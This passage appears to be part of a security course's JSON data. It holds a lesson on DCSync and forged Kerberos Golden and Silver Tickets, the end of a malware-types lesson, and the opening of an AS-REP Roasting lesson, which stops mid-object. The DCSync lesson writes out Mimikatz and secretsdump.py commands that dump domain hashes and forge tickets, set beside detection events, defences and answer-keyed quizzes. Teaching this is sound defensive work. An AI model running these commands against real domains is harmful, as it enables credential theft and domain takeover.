        "alt": "A field guide to malware types organised by purpose rather than by name. How it spreads: a virus needs a host file plus a user to run it, a worm self-propagates across the network with no host, a trojan is disguised as something the user wants. How it hides: a rootkit hides deep in the kernel to evade detection, fileless malware lives in memory with no file to scan, packers and crypters obfuscate the code. How it delivers: a dropper carries and drops the payload, a loader fetches and runs the next stage, a downloader pulls more malware. What it steals: spyware watches the user, an infostealer grabs passwords, cookies, and wallets, a keylogger records keystrokes. How it controls: a RAT gives full remote control, a bot joins a botnet and takes commands, a backdoor provides quiet re-entry. The payoff or impact: ransomware encrypts and extorts, a wiper destroys data with no ransom, a cryptominer steals compute. Two ideas to carry: the labels overlap and combine, since real malware is usually several of these at once such as a trojan dropper that loads an infostealer, so describe what the sample does rather than hunting one label; and the category tells you what to check next — infostealer means what credentials and data left, worm means which other hosts, RAT means what command and control, ransomware means scope and backups.",
        "caption": "Malware is categorised by PURPOSE — spread, hide, deliver, steal, control, payoff. Real samples combine several, so describe what it DOES; each category drives the next investigation question.",
        "credit": "Figure authored for this course."
      }
    },
    {
      "heading": "What the Malware Type Tells You to Do",
      "content": "Categorising malware is not an academic exercise — the type is a **decision aid**. When an antivirus or EDR alert names what it found, that label tells you what the threat is trying to accomplish, and that sets your triage priority and your very next action. Reading the type is how you turn a detection into a response.\n\n### The type drives the response\n\nEach purpose implies a different first move:\n\n- **Ransomware / wiper** — highest urgency. Isolate the host immediately before encryption spreads to shared drives, and check that backups are intact and offline.\n- **Infostealer** — assume the credentials, cookies, and tokens on that host were taken. Scope which accounts and secrets were exposed and force resets.\n- **RAT / backdoor** — the attacker may have interactive, hands-on-keyboard control. Hunt for the command-and-control connection and any persistence, and expect the intrusion to be live.\n- **Worm** — assume spread. Immediately check whether other hosts show the same indicators.\n- **Dropper / loader** — the file you caught is only stage one. Find and analyse the second-stage payload it fetched or wrote.\n- **Rootkit** — assume deep, hidden persistence; consider memory forensics, and often a rebuild is the safest path.\n- **Cryptominer** — lower data-theft risk, but it still confirms a foothold and resource abuse, so find how it got in.\n\n### Priority and first action at a glance\n\n| Malware type | Triage priority | Analyst's first move |\n| --- | --- | --- |\n| Ransomware / wiper | Critical | Isolate host, protect backups |\n| Infostealer | High | Scope and reset exposed credentials |\n| RAT / backdoor | High | Hunt C2 and persistence |\n| Worm | High | Check other hosts for spread |\n| Dropper / loader | Medium-High | Find the second-stage payload |\n| Rootkit | High | Memory forensics; consider rebuild |\n| Cryptominer | Medium | Confirm foothold, find entry vector |\n\n### The label is a hint, not gospel\n\nOne caution ties back to the start of this lesson: vendor detection names are a *starting point*, not the final word. Generic labels like `Trojan.Generic` or `Malware.Heuristic` tell you little, and a single sample often spans categories (a trojan that drops a loader that installs an infostealer). So let the type orient your first move, then confirm by what the sample actually **did** — the behaviour, not just the name. Even a rough type read is enough to set urgency and direction, which is exactly why this field guide is a working tool rather than trivia: it turns the question \"what did we catch?\" into \"what do I do about it, right now?\""
    }
  ],
  "keyTakeaways": [
    "Malware terms describe PURPOSE, not exclusive labels, and real samples combine many at once (a trojan dropper that loads an infostealer and installs a backdoor). Learn them as lenses: how it spreads (virus needs host+user; worm self-propagates; trojan is a user-tricking disguise), how it hides (rootkit=kernel stealth; fileless=in-memory; packer=obfuscation), and how it's delivered (dropper carries the payload; loader/downloader fetches the next stage).",
    "The rest is theft, control, and payoff: spyware/infostealer/keylogger STEAL (creds, cookies, wallets, keystrokes); RAT/bot/backdoor give the attacker CONTROL and re-entry; ransomware/wiper/cryptominer are the PAYOFF (extort/destroy/steal compute). Naming the category drives your next question — infostealer→what data left, worm→which hosts, RAT/backdoor→what C2 and re-entry, ransomware→scope + backups — so the type is the fastest route to the right investigation and response.",
    "Reading the malware type sets triage priority and first action: ransomware/wiper is critical (isolate the host, protect backups), infostealer means reset exposed credentials, RAT/backdoor means hunt C2 and persistence, worm means check other hosts for spread, and dropper/loader means find the second stage — while treating the vendor label as a hint to confirm by behaviour."
  ],
  "quiz": [
    {
      "question": "During triage you determine a sample was disguised as a software update the user ran (no self-spreading), which then wrote a second program to disk and executed it; that second program harvested saved browser passwords and cookies and sent them out. Using the purpose-based categories, how would you describe this sample, and why does the description matter more than a single label?",
      "options": [
        {
          "label": "It is simply 'a virus', because all malware is a virus, and forcing every sample into that one category is the standard and correct way analysts classify malicious software",
          "value": "a"
        },
        {
          "label": "A trojan (disguise, no self-spread) acting as a dropper (writes + runs a second stage) delivering an infostealer (harvests creds/cookies) — naming what it DOES tells you what data left and which accounts are exposed",
          "value": "b"
        },
        {
          "label": "It must be a worm, because any malware that writes a file to disk is by definition self-propagating across the network, which is the single defining property of every type of malware",
          "value": "c"
        },
        {
          "label": "The categories are irrelevant labels, so the only correct action is to record the file hash and close the case, since what a sample actually does has no bearing on the investigation",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The sample combines categories by purpose: a trojan (disguised as an update, relying on the user, not self-spreading), acting as a dropper (writing and running a second stage), which is an infostealer (harvesting saved passwords and cookies and exfiltrating them). Describing what it does across categories is what drives the investigation — an infostealer means you must determine what credentials and data left and which accounts are now exposed. Option a wrongly collapses everything to 'virus.' Option c misdefines a worm (writing a file is not self-propagation). Option d dismisses the categories that actually direct the response."
    },
    {
      "question": "An analyst confirms a host is infected with a worm. Beyond cleaning the infected host, what is the single most urgent question the 'worm' category should immediately prompt, and why?",
      "options": [
        {
          "label": "What ransom amount is being demanded, because every worm's defining purpose is to encrypt files and extort payment, so the ransom note is always the first thing to locate and analyse",
          "value": "a"
        },
        {
          "label": "Which other hosts has it already spread to — because a worm self-propagates across the network on its own, so by the time one host is found the infection has very likely reached others that must be found and contained",
          "value": "b"
        },
        {
          "label": "Nothing further is needed, because a worm cannot spread beyond the single machine it first infects, so cleaning that one host fully resolves the entire incident with no wider scope",
          "value": "c"
        },
        {
          "label": "What the user clicked to run it, because a worm requires a user to open a host file to propagate, making the user's action the only relevant factor in a worm investigation",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A worm's defining property is that it self-propagates across the network with no host file and no user action, so identifying a worm should immediately raise the scope question: which other hosts has it already reached? By the time you find one infected machine, a worm has likely spread further, and containment depends on finding and isolating the rest. Option a confuses worms with ransomware. Option c is exactly wrong — self-spreading is the whole danger. Option d describes a virus (needs a host file and user), not a worm, which needs neither."
    }
  ],
  "references": [
    "https://attack.mitre.org/tactics/TA0002/",
    "https://www.cisa.gov/news-events/news/understanding-hidden-threats-rootkits-and-botnets",
    "https://attack.mitre.org/software/"
  ],
  "xp": 190,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-dcsync-golden-silver-ticket",
  "slug": "dcsync-golden-silver-ticket",
  "title": "DCSync, the krbtgt Hash, and Forging Golden & Silver Tickets",
  "topic": "Active Directory Attacks",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "Once an attacker can replicate directory data or steal the krbtgt account's hash, they no longer need to steal individual passwords: they can mint their own Kerberos tickets that no password check can catch. This lesson assumes you have never studied Kerberos before, so it starts from zero: what a 'ticket' actually is, what a cryptographic hash is, and what 'replication' means between domain controllers, before building up to DCSync, Golden Tickets, and Silver Tickets. We walk through the real tool commands attackers run (Mimikatz, Impacket's secretsdump.py), a full worked attack chain with a correlated event timeline, the exact Windows Event IDs and log fields a SOC uses to catch each stage, and how to defend the trust root all three techniques attack. By the end you should be able to read a 4662/4768/4769 sequence and know, precisely, what happened.",
  "sections": [
    {
      "heading": "Start Here: Kerberos, Tickets, and Hashes From Zero",
      "content": "Everything in this lesson attacks one thing: the way Windows domains prove who you are. Before DCSync or Golden Tickets make any sense, four building blocks need to be solid.\n\n### What is a hash?\n\nA **hash** is a one-way scramble of data: you feed in a password, and a mathematical function spits out a fixed-length string of gibberish that cannot practically be reversed back into the password. Windows never stores your actual password; it stores a hash of it, and every time you type your password, Windows hashes what you typed and compares the two hashes. If an attacker steals the hash itself, they usually cannot 'unhash' it directly, but as this lesson shows, in Kerberos the hash often works as well as the password itself, because it IS the cryptographic key used to encrypt and sign things.\n\n### What is Kerberos, and what is a ticket?\n\n**Kerberos** is the authentication protocol Windows domains use to prove identity without sending passwords over the network. Instead of a password, Kerberos issues **tickets**: small, time-limited, cryptographically signed pieces of data that say 'this identity was verified.' There are two kinds you must keep straight for this lesson:\n\n- A **TGT (Ticket-Granting Ticket)** works like a wristband handed out at the front gate of a festival: once, at login, you prove who you are, and you are given a wristband. For the rest of the day you do not re-prove your identity at every stage; you just show the wristband.\n- A **TGS (Ticket-Granting Service ticket)**, often called a service ticket, works like a ticket for one specific stage: you show your wristband (TGT) at a booth, and it hands you a small paper ticket that only admits you to one particular stage, meaning one particular service such as a file share or a database.\n\nThe office that hands out both is the **KDC, the Key Distribution Center**, a role every Domain Controller plays. Getting a TGT is an **AS-REQ / AS-REP exchange** (Authentication Service); trading a TGT for a TGS is a **TGS-REQ / TGS-REP exchange** (Ticket-Granting Service).\n\n### What is krbtgt, and why is it the master key?\n\nHere is the part that makes this whole lesson dangerous. Every wristband (TGT) issued anywhere in the domain is signed and encrypted using the password hash of one special, hidden account: **krbtgt**. This account never logs in; it exists purely to hold the key that signs every TGT in the domain. Whoever controls the krbtgt hash controls the office that stamps wristbands, and can stamp their own, for anyone, without ever going through the front gate.\n\n### What is replication?\n\nA domain usually has more than one Domain Controller, and they all need an identical copy of the directory (all the users, groups, and password hashes). They keep themselves in sync through **replication**: DCs periodically ask each other what changed since the last sync, and copy the differences, including secret data like password hashes. Replication is a normal, constant, trusted background process between DCs, which is exactly what the first attack in this lesson pretends to be.\n\nWith hash, ticket, krbtgt, and replication defined, we can look at how an attacker weaponises each one."
    },
    {
      "heading": "DCSync: Impersonating a Domain Controller",
      "content": "**DCSync** (MITRE **T1003.006**, OS Credential Dumping: DCSync) abuses the **Directory Replication Service Remote Protocol (MS-DRSR)**, the very protocol two real Domain Controllers use to replicate with each other. Rather than running code on a DC or scraping LSASS memory, the attacker's own workstation simply sends a replication request and claims to be a Domain Controller. If the DC believes the request is authorised, it dutifully replicates the requested account's secrets, including password hashes, back to whoever asked.\n\n### Why the DC 'believes' it\n\nActive Directory does not check where a replication request physically comes from; it checks whether the calling security principal holds the right permissions on the domain object. Three extended rights matter:\n\n- **DS-Replication-Get-Changes** — read normal, non-secret replicated attributes.\n- **DS-Replication-Get-Changes-All** — the dangerous one: also read secret attributes like password hashes.\n- **DS-Replication-Get-Changes-In-Filtered-Set** — needed for certain filtered attribute sets, such as RODC scenarios.\n\nBy default only **Domain Admins**, **Enterprise Admins**, and the DC computer accounts themselves hold these rights. An attacker reaches DCSync in one of two ways: by first compromising an account that already has them, or by finding an ACL misconfiguration where some other account or group was, at some point, delegated these rights, often by mistake or by an over-broad 'IT support' role. That kind of edge is exactly what BloodHound is built to surface (see the companion LDAP/BloodHound lesson).\n\n### Running it\n\nWith a privileged, or misconfigured-delegate, account in hand, DCSync is one command. In Mimikatz:\n\n```\nmimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt\n```\n\nOr with Impacket's secretsdump.py, which can pull every account's hash in one pass:\n\n```\nsecretsdump.py corp.local/svc-helpdesk02:P@ssw0rd2024@10.0.0.10 -just-dc\n```\n\nNeither tool authenticates interactively against a DC console or reads LSASS memory on a server. From the network's point of view this looks like one more replication conversation between two DCs, which is precisely why it is quiet.\n\n### The prize: krbtgt\n\n| Attribute stolen | What the attacker can then do |\n|---|---|\n| A normal user's NTLM hash | Pass-the-Hash, offline cracking |\n| The krbtgt hash | Forge Golden Tickets (next section) |\n| A service account's hash | Forge Silver Tickets |\n\nDCSync of krbtgt specifically is the technique's most damaging use, because, as the primer above explained, krbtgt's hash is the master key that signs every TGT in the domain. Steal it once, and the attacker can mint valid-looking wristbands forever, without ever going through the KDC again."
    },
    {
      "heading": "The Golden Ticket: Forging a TGT",
      "content": "A **Golden Ticket** (**T1558.001**, Steal or Forge Kerberos Tickets: Golden Ticket) is a TGT the attacker builds themselves, entirely offline, using the stolen krbtgt key from DCSync or from dumping it directly off a DC. Recall from the primer: a TGT is normally handed out by the KDC only after it verifies who you are, and it is trustworthy because it is encrypted and signed with the krbtgt key. Once the attacker holds that key too, they can produce a ticket that is byte-for-byte as trustworthy as a real one, without the KDC ever being involved in issuing it.\n\n### What forging one needs\n\nTo build a Golden Ticket the attacker needs exactly three things: the **domain SID**, easy to obtain from any authenticated session; the **krbtgt key** (NTLM or AES), from DCSync; and a **target username**, often Administrator, or even a username that does not exist in AD at all, since nothing checks.\n\n### Forging it, step by step\n\n```\nmimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1957994955-1957994955-1957994955 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /id:500 /groups:512 /ptt\n```\n\nBreaking down the flags: `/user` and `/domain` name the identity to impersonate; `/sid` is the domain SID; `/krbtgt` is the stolen key; `/id:500` sets the impersonated user's RID to 500, the well-known RID of the built-in Administrator account, even if the ticket's username is something else entirely; `/groups:512` injects membership in Domain Admins (RID 512) directly into the ticket's PAC, the Privilege Attribute Certificate structure inside the ticket that lists group memberships; `/ptt` means Pass-the-Ticket, injecting the forged ticket straight into the current logon session's memory so it is usable immediately.\n\n### Why it is 'game over'\n\nBecause the ticket is trusted domain-wide and its group memberships are simply asserted rather than looked up in AD, a Golden Ticket:\n\n- Grants access to **any service on any host** in the domain, since any TGS request built on top of it succeeds.\n- **Survives a password reset** on the impersonated account, because the ticket never checks the account's current password.\n- Can impersonate accounts that are **disabled**, or that do not exist, since nothing in forging queries AD to confirm the account is real.\n- Can carry an **arbitrary lifetime**. Historically, default Mimikatz Golden Tickets used a 10-year lifetime, wildly outside a normal domain's Kerberos policy of a roughly 10-hour TGT with up to a 7-day renewal window, and a strong detection tell.\n- Can inject **SID History** values into the PAC, smuggling in membership of highly privileged groups without ever actually joining that group, bypassing group-membership-based monitoring entirely.\n\n### The only real fix\n\nBecause the ticket's trust flows entirely from the krbtgt key, the only effective remediation is rotating the krbtgt account's password **twice**. A single rotation is not enough: AD deliberately keeps the previous krbtgt key alive for replication continuity across DCs during the rotation window, so a ticket forged with the old key still validates until that old key is also retired by a second rotation."
    },
    {
      "heading": "The Silver Ticket: Forging a Service Ticket",
      "content": "A **Silver Ticket** (**T1558.002**, Silver Ticket) is a forged TGS rather than a forged TGT. Instead of stealing krbtgt, the attacker steals or cracks the password hash of one specific service or computer account: the account whose key protects one particular service, such as a file server's **CIFS** service, a host's **HOST** service covering WMI and scheduled tasks, or a SQL server's **MSSQLSvc**. Since every domain-joined computer has its own machine account with its own hash, and that hash is what a HOST or CIFS service ticket is encrypted with, cracking or dumping that one computer's hash is enough to forge tickets for services on that one machine.\n\n### Forging it\n\nMimikatz uses the same underlying command as a Golden Ticket, but adding `/target` and `/service` turns it into a Silver Ticket instead:\n\n```\nmimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1957994955-1957994955-1957994955 /target:fs01.corp.local /service:cifs /rc4:c8a942fc4e0aa8b8b3c5b1234abcf51e /ptt\n```\n\nHere `/target` names the specific server, `/service` names the specific service class such as `cifs` for file shares, `host` for a broad set of remote-management services, or `mssqlsvc` for SQL Server, and `/rc4` is the target service account's hash rather than krbtgt.\n\n### The critical operational difference\n\nA real client normally gets a TGS by presenting its TGT to the KDC and asking for one. A Silver Ticket skips that request entirely: the attacker builds the TGS offline and hands it directly to the target service, which validates it using its own key without ever asking the DC to vouch for it. Unlike using a Golden Ticket to request a new service ticket, the Domain Controller never sees a Silver Ticket transaction at all; there is no DC-side request to log, which is exactly why Silver Tickets are considered stealthier.\n\n### Comparing the two forgeries\n\n| Property | Golden Ticket | Silver Ticket |\n|---|---|---|\n| Signed with | krbtgt key | One service or computer account's key |\n| Ticket type | TGT, the 'wristband' | TGS, a 'single-stage pass' |\n| Scope | Entire domain, any service | One service on one target host |\n| Touches the DC? | Yes, when requesting each new service ticket | No, never contacts the DC |\n| Invalidated by | Rotating krbtgt twice | Rotating that one service account's password |\n\n### Why attackers still like the smaller blast radius\n\nA Silver Ticket only unlocks the one service it was built for, which sounds limiting, but attackers often chain several Silver Tickets, one per target host and service, for lateral movement precisely because of the reduced DC-side visibility. Computer accounts are an especially attractive target: their passwords are long, machine-generated, and randomised, so administrators rarely track or rotate them on any human schedule, giving a stolen computer-account hash a long useful life."
    },
    {
      "heading": "Putting It Together: A Worked Attack Chain",
      "content": "Seeing DCSync and ticket forging as one continuous chain, rather than three separate techniques, is how a SOC actually reconstructs an incident. Here is a realistic sequence, with the commands an attacker runs and the events a defender would see, side by side.\n\n### The scenario\n\nAn attacker has already compromised a low-privilege helpdesk account, `svc-helpdesk02`, and, through recon covered in the companion LDAP/BloodHound lesson, discovered it was mistakenly delegated DS-Replication-Get-Changes-All rights on the domain object.\n\n### Step by step\n\n1. **DCSync the krbtgt hash.**\n\n```\nsecretsdump.py corp.local/svc-helpdesk02:P@ssw0rd2024@dc01.corp.local -just-dc-user krbtgt\n```\n\nOn `dc01`, this generates Event ID 4662, naming `svc-helpdesk02` as the subject, with the replication-rights GUIDs in the Properties field, from a source account that is not a Domain Controller.\n\n2. **Forge a Golden Ticket for Domain Admin access.**\n\n```\nmimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1957994955-1957994955-1957994955 /krbtgt:<hash from step 1> /groups:512 /ptt\n```\n\nNo event fires on the DC yet; the ticket is built entirely offline, in memory on the attacker's machine.\n\n3. **Use the forged ticket to reach a file server.** The attacker requests a service ticket to `fs01.corp.local` using the forged TGT. Because the underlying TGT is fake, this still produces Event ID 4769 (service ticket requested) on the DC for the Administrator account, but critically there is no corresponding Event ID 4768 (TGT requested) for that logon session immediately before it, because this KDC never actually issued the TGT.\n\n4. **Move laterally and persist.** With Domain Admin-equivalent access, the attacker could stop here, since Golden Ticket access persists for as long as the krbtgt key is valid, potentially years if the ticket's lifetime field was inflated, or additionally forge Silver Tickets for specific services to reduce reliance on the noisier, DC-touching Golden Ticket path for routine access.\n\n### Reading this as a defender\n\nThis chain shows why SOC detection logic must correlate across steps rather than alert on any one line: the 4662 in step 1 is the earliest, highest-fidelity signal; the missing-4768-before-4769 pattern in step 3 is the confirmation; and the eventual privileged actions, such as file access or new group memberships, are the blast radius. Catching step 1 stops everything downstream."
    },
    {
      "heading": "Detection: The Events That Betray Forged Tickets",
      "content": "**DCSync detection** hinges on **Event ID 4662** (An operation was performed on an object) on Domain Controllers, with object auditing (SACL) enabled on the domain object; without that, 4662 will not fire at all, so verify audit policy first. Watch for 4662 events where the Properties field lists the replication-rights GUIDs and the Subject is not a Domain Controller account:\n\n- **1131f6aa-9c07-11d1-f79f-00c04fc2dcd2** — DS-Replication-Get-Changes\n- **1131f6ad-9c07-11d1-f79f-00c04fc2dcd2** — DS-Replication-Get-Changes-All\n\nA representative event looks like:\n\n```\nEventID: 4662\nSubjectUserName: svc-helpdesk02\nSubjectDomainName: CORP\nObjectServer: DS\nObjectType: domainDNS\nProperties: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\nAccessMask: 0x100\n```\n\nA user or workstation triggering these GUIDs, anyone other than a legitimate DC computer account, is a high-fidelity DCSync signal. Correlate with network flow data: legitimate MS-DRSR replication traffic is DC-to-DC only, so a replication request sourced from a workstation or member-server IP is anomalous on its own, independent of the event log.\n\n**Golden Ticket tells** appear in Event ID 4769 (Kerberos service ticket requested) and 4768 (TGT requested). Because a forged TGT was never issued by this KDC, you will often see a 4769 with no matching preceding 4768 for that logon session, the pattern shown in the worked chain above. Also flag:\n\n- **Anomalous ticket lifetimes** far exceeding domain Kerberos policy, the classic multi-year artifact from default forging-tool settings.\n- **Encryption type downgrades** to RC4 (0x17) in an environment that normally negotiates AES (0x12 for AES256, 0x11 for AES128), since older forging tooling defaults to RC4.\n- **Mismatched or nonexistent account fields**, tickets for usernames that do not resolve in AD, or a SID that does not match the claimed domain.\n\n**Silver Ticket detection** is harder precisely because the DC is bypassed. Pivot instead to the target host's own logs: Event ID 4624 (logon) and 4672 (special privileges assigned) appearing on a server without any corresponding 4768/4769 on the Domain Controller for that session indicates a service ticket the KDC never issued. Feed all of this into a SIEM/UEBA baseline; ticket-lifetime and encryption-type anomalies are exactly the low-noise, high-precision indicators correlation rules should key on, since they almost never occur in legitimate traffic."
    },
    {
      "heading": "Defence: Protecting the Trust Root",
      "content": "The strategic goal is to keep the krbtgt key and privileged hashes out of attacker hands, and to make forged tickets short-lived if a key does leak.\n\n### Protect and rotate krbtgt\n\nTreat krbtgt as the most sensitive secret in the domain. Rotate its password on a defined schedule and immediately, twice, after any suspected DA compromise. The double rotation is mandatory because AD retains the previous key for replication; a single reset leaves existing Golden Tickets valid. Microsoft and community scripts, such as the New-KrbtgtKeys reset tooling, automate a safe, replication-aware rotation.\n\n### Enforce administrative tiering\n\nImplement the tiered model, where Tier 0 covers DCs, AD, and identity systems; Tier 1 covers servers; Tier 2 covers workstations. Never let Tier 0 credentials log on to Tier 2 machines, where they can be scraped from LSASS. This directly starves DCSync of the privileged accounts it needs.\n\n### Harden credential exposure\n\n- Enable **Windows Defender Credential Guard** to isolate secrets in a VBS enclave, blocking LSASS hash theft.\n- Add sensitive accounts to the **Protected Users** group and mark them 'account is sensitive and cannot be delegated.'\n- Prefer **AES** Kerberos encryption and disable RC4 where feasible, shrinking the attack surface and making RC4 usage itself an alert.\n\n### Audit and monitor replication rights\n\nRegularly review which principals hold DS-Replication-Get-Changes-All on the domain object; only DCs and intended admins should. Alert on any new grant. Use **gMSA** for service accounts so their long passwords rotate automatically, weakening Silver Ticket persistence. Finally, restrict SeEnableDelegationPrivilege and monitor for unexpected SID History values, which forged PACs abuse to smuggle privileged SIDs."
    }
  ],
  "keyTakeaways": [
    "A TGT is a domain-wide wristband and a TGS is a single-service pass, both signed by keys derived from account password hashes; the krbtgt account's hash signs every TGT in the domain, which is why stealing it equals owning the trust root itself.",
    "DCSync (T1003.006) abuses AD replication rights (DS-Replication-Get-Changes-All) to pull the krbtgt hash without touching LSASS, generating Event ID 4662 on the DC from a non-DC source when object auditing is enabled.",
    "Golden Tickets (T1558.001) forge a TGT with the krbtgt key, granting domain-wide access that survives password resets and is only truly invalidated by rotating krbtgt twice, because AD keeps the previous key alive for replication continuity.",
    "Silver Tickets (T1558.002) forge a single service's TGS with that service or computer account's key and never touch the DC at all, so detection shifts from 4768/4769 on the DC to 4624/4672 on the target host with no matching DC-side ticket request.",
    "A real attack chain correlates across stages: an early 4662 replication signal, a missing 4768 before a later 4769, and downstream privileged actions; catching the earliest signal (the DCSync itself) stops every subsequent stage."
  ],
  "quiz": [
    {
      "question": "A SOC analyst spots Event ID 4662 on a Domain Controller where a standard user workstation accessed the object property GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2. What is the most likely activity, and why is it dangerous?",
      "options": [
        {
          "label": "A benign group policy refresh reading directory objects, which is expected background traffic on every domain-joined workstation each cycle.",
          "value": "a"
        },
        {
          "label": "A DCSync attempt using Get-Changes-All replication rights, dangerous because it can extract the krbtgt hash for ticket forging.",
          "value": "b"
        },
        {
          "label": "A routine LDAP bind from an authenticated user enumerating their own group memberships during an interactive logon session.",
          "value": "c"
        },
        {
          "label": "A normal krbtgt password rotation being replicated between two domain controllers as part of scheduled maintenance activity.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: the GUID 1131f6ad is DS-Replication-Get-Changes-All, and a non-DC workstation invoking it via 4662 is a classic DCSync signature that can pull the krbtgt hash. (a) GPO refreshes do not request replication extended rights. (c) LDAP group enumeration does not touch replication property GUIDs. (d) Replication happens DC-to-DC, not from a user workstation, so a workstation source rules this out."
    },
    {
      "question": "During an investigation you find a host with Event ID 4624 and 4672 for a privileged logon to a file service, but the Domain Controllers show no matching 4768 or 4769 for that session. Which attack best explains this pattern?",
      "options": [
        {
          "label": "A Golden Ticket, because the forged TGT would generate a burst of 4768 pre-authentication events visible directly on the domain controllers.",
          "value": "a"
        },
        {
          "label": "A Silver Ticket, because the forged service ticket is validated by the target service itself and never reaches the domain controller.",
          "value": "b"
        },
        {
          "label": "AS-REP Roasting, because the attacker requested authentication data for a preauth-disabled account through the domain controller.",
          "value": "c"
        },
        {
          "label": "A standard Pass-the-Hash logon, which always produces a corresponding 4769 service ticket request on the issuing domain controller.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: a Silver Ticket forges a TGS signed with the service/computer account key and is presented straight to the service, so no 4768/4769 appears on the DC while the host still logs 4624/4672. (a) Golden Tickets do produce DC-side 4769 traffic when requesting service tickets, unlike this DC-silent pattern. (c) AS-REP Roasting is a credential-cracking recon step, not a host logon. (d) Pass-the-Hash over Kerberos still involves DC ticket requests, so the missing DC events contradict it."
    },
    {
      "question": "A SOC remediates a confirmed Golden Ticket attack by resetting the krbtgt account password exactly once. Why does this fail to fully remediate the incident?",
      "options": [
        {
          "label": "Because AD keeps the old krbtgt key active for replication, so a single reset leaves old forged tickets still valid.",
          "value": "a"
        },
        {
          "label": "Because krbtgt passwords cannot be reset through normal Active Directory tools and require a full forest rebuild instead.",
          "value": "b"
        },
        {
          "label": "Because Golden Tickets are re-issued automatically every ten minutes by the domain regardless of any krbtgt password change.",
          "value": "c"
        },
        {
          "label": "Because resetting krbtgt immediately locks out every domain user account until the next scheduled password sync completes.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Correct: AD deliberately keeps the previous krbtgt key alive for replication continuity across DCs, so any Golden Ticket forged with the old key still validates until a second rotation retires that old key. (b) krbtgt can be reset with standard AD tools (or dedicated safe-rotation scripts); no forest rebuild is needed. (c) Golden Tickets are static forged artifacts, not re-issued by the domain. (d) A krbtgt reset does not lock out ordinary user accounts."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1003/006/",
    "https://attack.mitre.org/techniques/T1558/001/",
    "https://attack.mitre.org/techniques/T1558/002/",
    "https://learn.microsoft.com/en-us/defender-for-identity/credential-access-alerts"
  ],
  "xp": 260,
  "estimatedMinutes": 55,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-as-rep-roasting",
  "slug": "as-rep-roasting",
  "title": "AS-REP Roasting: Cracking Accounts That Skip Kerberos Preauth",
  "topic": "Active Directory Attacks",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "AS-REP Roasting exploits a single dangerous account setting: 'do not require Kerberos preauthentication.' When it is set, any attacker can request an authentication response containing material encrypted with the user's password, then crack it offline with no lockout and no failed-logon noise. This lesson assumes no prior Kerberos knowledge and starts from zero: what happens the moment you log in to a domain, what pre-authentication is protecting against, and why skipping it is catastrophic. From there we walk through the real tool commands (Rubeus, Impacket's GetNPUsers.py, Hashcat), how AS-REP Roasting differs from the similarly-named Kerberoasting, the exact Event ID 4768 fields that expose it, and how to close the gap.",
  "sections": [
    {
      "heading": "Start Here: Kerberos Login and Why Preauth Exists",
      "content": "Before AS-REP Roasting makes sense, you need to understand what happens the very first moment you log in to a Windows domain, and why one specific proof step exists.\n\n### The front-gate exchange: AS-REQ and AS-REP\n\nWhen you type your password to log into a domain machine, your computer does not send that password anywhere. Instead, Kerberos runs an **AS-REQ / AS-REP exchange** with a Domain Controller acting as the KDC, the Key Distribution Center, the office that hands out tickets (see the companion DCSync/Golden Ticket lesson for the full ticket picture if this is new). Your computer sends an **AS-REQ (Authentication Service Request)**, in effect asking: 'I am this user, give me a TGT, a wristband that proves I logged in.' If the KDC is satisfied, it replies with an **AS-REP (Authentication Service Response)** containing that TGT.\n\n### Why 'satisfied' normally requires proof first\n\nHere is the crucial design detail. By default, before the KDC will hand out a TGT, your computer must first prove it actually knows your password, without ever sending the password itself. It does this by encrypting a timestamp with a key derived from your password and attaching it to the AS-REQ. This step is called **Kerberos pre-authentication (preauth)**. The KDC, which also knows your password's hash, tries to decrypt that timestamp. If it can, and the timestamp is recent, you have proven you know the password, and only then does it issue the AS-REP with the TGT.\n\nThink of it like a nightclub bouncer who, before letting you in, asks you to whisper a password only members know. Preauth is that whisper check, performed cryptographically instead of literally.\n\n### What happens if the whisper check is switched off\n\nSome accounts have a setting that disables this check: **DONT_REQ_PREAUTH**, a flag inside the account's `userAccountControl` attribute (bit value **0x400000**). If that flag is set, the KDC skips the whisper check entirely; it hands out the AS-REP to anyone who asks for that username, no proof required.\n\nThis alone would not be catastrophic, except for one more fact: part of that AS-REP, specifically the field carrying the session key, is still encrypted with a key derived from the account's password, exactly as in the normal exchange. The KDC just stopped checking that key before responding; it never stopped using it to encrypt part of the reply.\n\n### Why that is exploitable: offline cracking\n\nAn attacker who receives this AS-REP now holds a piece of ciphertext that only decrypts correctly with the right password-derived key. They can take that ciphertext away, to their own hardware, and try candidate passwords one by one, encrypting each guess the same way and checking if the result matches. This is called **offline cracking**: unlike typing a wrong password at the actual login screen, there is no server involved to notice repeated wrong guesses, no lockout counter, and no rate limit; the attacker's own GPU is the only limit on how fast they can try candidates. This is the exact mechanism AS-REP Roasting weaponises, covered next."
    },
    {
      "heading": "What AS-REP Roasting Is",
